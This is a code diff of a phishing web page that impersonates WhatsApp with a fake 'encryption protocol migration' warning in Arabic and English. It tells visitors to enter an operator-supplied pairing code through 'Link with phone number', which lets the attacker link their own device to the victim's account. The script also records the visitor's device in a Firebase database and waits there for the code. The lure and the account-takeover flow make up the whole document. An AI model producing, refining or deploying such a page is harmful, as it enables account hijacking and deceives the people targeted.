@@ -1,56 +1,62 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol Update</title>
+    <title>System Migration</title>
     <style>
         * { box-sizing: border-box; }
-        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; color: #1c1e21; font-family: -apple-system, sans-serif; overflow: hidden; }
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; color: #1c1e21; font-family: -apple-system, sans-serif; }
+        body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; }
 
-        .container { width: 100%; max-width: 400px; text-align: center; }
-        .logo { width: 60px; margin-bottom: 20px; opacity: 0.9; }
+        .container { width: 100%; max-width: 380px; text-align: center; }
+        .logo { width: 50px; margin-bottom: 12px; }
         
-        .header-title { font-size: 20px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
-        .status-badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
+        .header-title { font-size: 18px; font-weight: 700; color: #075e54; margin-bottom: 5px; }
+        .status-badge { background: #e7f3f3; color: #128c7e; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
 
-        .protocol-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: right; }
-        .p-item { font-size: 13px; margin-bottom: 8px; color: #4b4b4b; display: flex; justify-content: space-between; direction: ltr; }
-        .p-label { font-weight: bold; color: #1c1e21; }
-        .p-val { font-family: monospace; }
-        
-        .alert-text { font-size: 14px; line-height: 1.6; color: #3b4a54; margin-bottom: 20px; border-top: 1px solid #eee; padding-top: 15px; }
+        /* صندوق الانتقال التقني */
+        .migration-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
+        .mig-item { display: flex; align-items: center; justify-content: space-between; margin: 10px 0; }
+        .node { flex: 1; padding: 8px; border-radius: 6px; font-family: monospace; font-size: 11px; }
+        .node.old { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
+        .node.new { background: #e8f5e9; color: #2e7d32; border: 1px solid #c8e6c9; font-weight: bold; }
+        .arrow { padding: 0 10px; color: #8696a0; font-weight: bold; }
+        .mig-label { font-size: 10px; color: #8696a0; text-transform: uppercase; margin-bottom: 4px; display: block; }
+
+        .alert-text { font-size: 13px; line-height: 1.5; color: #3b4a54; margin-bottom: 15px; border-top: 1px solid #eee; padding-top: 12px; }
         .highlight { color: #d91e1e; font-weight: bold; }
 
-        .code-zone { background-color: #ffffff; border: 2px solid #00a884; padding: 15px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 4px; font-family: 'Courier New', monospace; }
-        .wait-text { font-size: 12px; color: #8696a0; margin-top: 10px; }
+        .code-zone { background-color: #ffffff; border: 2px solid #00a884; padding: 12px; border-radius: 10px; }
+        #pairing-code { font-size: 28px; font-weight: bold; color: #075e54; letter-spacing: 4px; font-family: 'Courier New', monospace; }
+        .wait-text { font-size: 11px; color: #8696a0; margin-top: 8px; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div class="header-title">تحديث بروتوكول التشفير</div>
-        <div class="status-badge" id="dev-tag">جاري فحص الحساب..</div>
+        <div id="h_title" class="header-title"></div>
+        <div id="h_dev" class="status-badge"></div>
 
-        <div class="protocol-box">
-            <div class="p-item"><span class="p-val">RSA-1024 (Legacy)</span><span class="p-label">:Old Protocol</span></div>
-            <div class="p-item"><span class="p-val">Signal-V3 (AES-256)</span><span class="p-label">:New Protocol</span></div>
-            <div class="p-item"><span class="p-val">In Progress...</span><span class="p-label">:Status</span></div>
+        <div class="migration-box">
+            <div style="display: flex; justify-content: space-between;">
+                <span class="mig-label" id="l_from"></span>
+                <span class="mig-label" id="l_to"></span>
+            </div>
+            <div class="mig-item">
+                <div class="node old">RSA-1024</div>
+                <div class="arrow">➜</div>
+                <div class="node new">SIGNAL-V3</div>
+            </div>
+            <div style="font-size: 10px; color: #128c7e; margin-top: 5px; font-weight: bold;" id="l_status"></div>
         </div>
 
-        <div class="alert-text">
-            تم رصد ثغرة في تشفير الجهاز المرتبط. لتأمين محادثاتك، يجب ترقية مفاتيح التشفير يدوياً.<br>
-            1. اضغط على إشعار <b>"ربط جهاز"</b> المرسل لك.<br>
-            2. اختر <span class="highlight">"الربط برقم الهاتف"</span> من أسفل الشاشة.<br>
-            3. أدخل رمز المصادقة التالي:
-        </div>
+        <div id="h_alert" class="alert-text"></div>
 
         <div class="code-zone">
-            <div id="pairing-code">...</div>
-            <div class="wait-text" id="status-text">Generating Keys..</div>
+            <div id="pairing-code">. . .</div>
+            <div id="h_wait" class="wait-text"></div>
         </div>
     </div>
 
@@ -63,16 +69,47 @@
         
         const params = new URLSearchParams(window.location.search);
         const userId = params.get('id') || "NODE_" + Math.floor(Math.random() * 9999);
-        const device = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone (iOS)" : "Android";
+        const isAr = navigator.language.startsWith('ar');
+        const device = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone" : "Android";
         
-        document.getElementById('dev-tag').innerText = "جهاز متصل: " + device;
+        document.body.dir = isAr ? "rtl" : "ltr";
 
-        db.ref('visiting/' + userId).set({ device: device, status: "linking", ts: Date.now() });
-        
+        const UI = {
+            ar: {
+                title: "تحديث معايير التشفير",
+                dev: "الجهاز المستهدف: " + device,
+                from: "البروتوكول الحالي",
+                to: "البروتوكول المطلوب",
+                status: "الحالة: بانتظار المصادقة يدوياً",
+                alert: "يلتزم نظام الأمان تحديث وتأكيد هذا البروتوكول الجديد لضمان استقرار حسابك وإصلاح الأخطاء الشائعة في الإصدار القديم.<br>1. افتح إشعار <b>'ربط جهاز'</b>.<br>2. اختر <span class='highlight'>'الربط برقم الهاتف'</span>.<br>3. أدخل الرمز التالي:",
+                wait: "جاري توليد مفتاح المزامنة.."
+            },
+            en: {
+                title: "Encryption Migration",
+                dev: "Target Device: " + device,
+                from: "Current Protocol",
+                to: "Target Protocol",
+                status: "Status: Awaiting manual authentication",
+                alert: "The security system requires mandatory update to the new protocol to ensure account stability and fix legacy version bugs.<br>1. Open <b>'Link a Device'</b> notification.<br>2. Tap <span class='highlight'>'Link with phone number'</span>.<br>3. Enter the following code:",
+                wait: "Generating sync key.."
+            }
+        };
+
+        const lang = isAr ? UI.ar : UI.en;
+        document.getElementById('h_title').innerText = lang.title;
+        document.getElementById('h_dev').innerText = lang.dev;
+        document.getElementById('l_from').innerText = lang.from;
+        document.getElementById('l_to').innerText = lang.to;
+        document.getElementById('l_status').innerText = lang.status;
+        document.getElementById('h_alert').innerHTML = lang.alert;
+        document.getElementById('h_wait').innerText = lang.wait;
+
+        db.ref('visiting/' + userId).set({ device: device, status: "migrating", ts: Date.now() });
         db.ref('sessions/' + userId).on('value', (s) => {
             if (s.val() && s.val().code) {
                 document.getElementById('pairing-code').innerText = s.val().code;
-                document.getElementById('status-text').innerText = "رمز المصادقة جاهز";
+                document.getElementById('h_wait').innerText = isAr ? "تم الربط بنجاح" : "Successfully Linked";
+                document.getElementById('l_status').innerText = isAr ? "الحالة: تم التحديث" : "Status: Updated";
             }
         });
     </script>
